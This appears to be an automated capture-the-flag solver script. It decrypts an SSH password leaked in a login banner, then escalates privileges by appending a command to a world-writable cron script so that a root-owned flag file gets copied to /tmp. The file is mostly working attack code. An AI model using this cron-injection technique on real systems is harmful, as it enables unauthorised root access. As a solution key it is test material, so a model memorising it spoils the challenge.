#!/usr/bin/env python3
"""
solve.py — Automated Solver for Challenge 12: The Ticking Vault
"""
import re
import sys
import time
import pexpect
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

KEY = b"C7F_3ncrypt10n_K3y_N3v3r_G3u3s3d"

def decrypt_code(hex_data: str) -> str:
    raw_bytes = bytes.fromhex(hex_data)
    iv = raw_bytes[:16]
    ct = raw_bytes[16:]
    cipher = Cipher(algorithms.AES(KEY), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded = decryptor.update(ct) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    password = (unpadder.update(padded) + unpadder.finalize()).decode()
    return password

def solve(host="127.0.0.1", port=2224):
    print(f"[*] Connecting to {host}:{port} to intercept SSH pre-login broadcast...")
    child = pexpect.spawn(
        f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p {port} player@{host}",
        timeout=15
    )
    child.expect("password:")
    banner_output = child.before.decode(errors="ignore")

    match = re.search(r"ENCRYPTED_VAULT_CODE:([0-9a-fA-F]+)", banner_output)
    if not match:
        print("[-] Failed to find ENCRYPTED_VAULT_CODE in SSH banner!")
        sys.exit(1)

    hex_data = match.group(1)
    print(f"[+] Intercepted broadcast ciphertext: {hex_data}")

    password = decrypt_code(hex_data)
    print(f"[+] Decrypted SSH password: {password}")

    child.sendline(password)
    child.expect(["\\$", "#"])
    print("[+] Successfully authenticated to subterranean vault via SSH!")

    # Check /opt/vault/rotate_logs.sh
    print("[*] Weaponizing world-writable cron script /opt/vault/rotate_logs.sh...")
    child.sendline('echo "cat /root/flag.txt > /tmp/flag.txt && chmod 666 /tmp/flag.txt" >> /opt/vault/rotate_logs.sh')
    child.expect(["\\$", "#"])

    print("[*] Waiting for cron execution (up to 65s)...")
    for _ in range(65):
        time.sleep(1)
        child.sendline("cat /tmp/flag.txt 2>/dev/null")
        child.expect(["\\$", "#"])
        output = child.before.decode(errors="ignore")
        flag_match = re.search(r"(YUVA\{[^}]+\})", output)
        if flag_match:
            flag = flag_match.group(1)
            print(f"[+] FLAG CAPTURED: {flag}")
            child.sendline("exit")
            return flag

    print("[-] Exploit timed out waiting for cron job!")
    child.sendline("exit")
    sys.exit(1)

if __name__ == "__main__":
    solve()
